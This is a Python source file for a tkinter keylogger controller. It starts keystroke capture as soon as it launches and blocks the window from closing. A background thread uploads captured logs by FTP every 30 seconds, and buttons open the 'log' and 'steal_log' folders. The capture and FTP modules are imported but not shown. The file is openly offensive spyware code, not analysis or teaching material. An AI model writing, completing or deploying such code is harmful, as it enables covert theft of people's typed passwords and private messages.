from tkinter import *
from tkinter import ttk
import sys ,os ,subprocess ,keyboard , key_detect ,time
from FTP import myftp
from threading import *
class gui:
    def __init__(self,master):
        self.master = master
        master.title("key logger ")
        master.geometry("580x300")
        
        self.frame_left = Frame(master, width=200, height=400, bg='black')
        self.frame_left.grid(row=0, column=0)
        
        self.frame_mid = Frame(master, width=200, height=400, bg='grey')
        self.frame_mid.grid(row=0, column=1)
        
        self.frame_right = Frame(master, width=200, height=400, bg='white')
        self.frame_right.grid(row=0, column=2)
        
        self.gotofile_B = Button(self.frame_right, text='Gotofile',command =func.goto_file_loc)
        self.gotofile_B.grid(row = 0, column= 0,padx = 10)

        self.gotolog_B = Button(self.frame_right, text='Gotolog',command =func.goto_log_loc)
        self.gotolog_B.grid(row = 0, column= 1 , padx = 5)

        
       

        self.starting_B = Button(master, text='Starting',command =func.start(),height= 5, width=10)
        self.starting_B.place(x = 50 , y = 100)

        self.FTP_B = Button(self.frame_mid, text='FTP',command = func.goto_log_steal_log,height= 5, width=10)
        self.FTP_B.place(x = 50 , y = 100)
        
class func_work:
    def open_sys(self,wantopen):
        print(sys.platform)
        path = os.path.join(os.path.dirname(__file__),wantopen)
        if sys.platform == 'win32':
            try:
                subprocess.check_call(['explorer', path])
            except subprocess.CalledProcessError as e:
                pass
        elif platform.system() == "Darwin":
            try:
                subprocess.Popen(["open", path])
            except subprocess.CalledProcessError as e:
                pass
        else:
            try:
                subprocess.Popen(["xdg-open", path])
            except subprocess.CalledProcessError as e:
                pass
    def goto_file_loc(self):
        self.open_sys('')
    def goto_log_loc(self):
        self.open_sys('log')
    def goto_log_steal_log(self):
        self.open_sys('steal_log')
    def start(self):
        works = Thread(target = key_detect.run)
        works.start()
    def on_closing(self):
        pass #not close window
    def ftp_use(self):
        print('upload file ....')
        upftp = myftp()
        upftp.upload()
    def test(self):
        while True:
            time.sleep(30)
            self.ftp_use()
            
#main run

func = func_work()  #function


root = Tk()
myroot = gui(root)
root.protocol("WM_DELETE_WINDOW", func.on_closing)
root.resizable(0,0)

def use_thread():
    func.test()
def do_thread():
    gg = Thread(target=use_thread)
    gg.start()
do_thread()
root.mainloop()

